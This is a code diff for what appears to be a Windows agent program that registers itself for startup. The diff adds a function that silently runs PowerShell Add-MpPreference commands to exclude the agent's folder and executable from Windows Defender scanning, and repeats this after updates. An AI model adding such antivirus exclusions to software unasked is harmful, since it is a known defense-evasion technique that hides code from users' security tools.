@@ -156,6 +156,55 @@ def unregister_task_scheduler() -> bool:
         return False
 
 
+def add_defender_exclusions() -> bool:
+    """Add Windows Defender exclusions for AGENT_DIR and the running exe.
+
+    Non-fatal — logs warnings on failure. Skips if already applied for the
+    current exe path (sentinel stored in AGENT_DIR/defender_excluded.flag).
+    Re-runs automatically after an update when the exe path changes.
+    """
+    if sys.platform != 'win32':
+        return False
+
+    exe = get_exe_path()
+    sentinel = config.AGENT_DIR / 'defender_excluded.flag'
+
+    if sentinel.exists():
+        try:
+            if sentinel.read_text(encoding='utf-8').strip() == exe:
+                return True  # already applied for this exe
+        except Exception:
+            pass
+
+    agent_dir = str(config.AGENT_DIR)
+    try:
+        script = (
+            f'Add-MpPreference -ExclusionPath "{agent_dir}" -ErrorAction SilentlyContinue; '
+            f'Add-MpPreference -ExclusionProcess "{exe}" -ErrorAction SilentlyContinue'
+        )
+        result = subprocess.run(
+            ['powershell', '-NonInteractive', '-NoProfile', '-Command', script],
+            capture_output=True,
+            timeout=30,
+        )
+        if result.returncode == 0:
+            try:
+                sentinel.write_text(exe, encoding='utf-8')
+            except Exception:
+                pass
+            logger.info('Defender exclusions added: path=%s, process=%s', agent_dir, exe)
+            return True
+        stderr = result.stderr.decode(errors='replace').strip()
+        logger.warning('Defender exclusion failed (rc=%d): %s', result.returncode, stderr)
+        return False
+    except subprocess.TimeoutExpired:
+        logger.warning('Defender exclusion timed out')
+        return False
+    except Exception as e:
+        logger.warning('Defender exclusion error: %s', e)
+        return False
+
+
 def register_all() -> None:
     """Register agent for startup in both registry and Task Scheduler."""
     exe = get_exe_path()
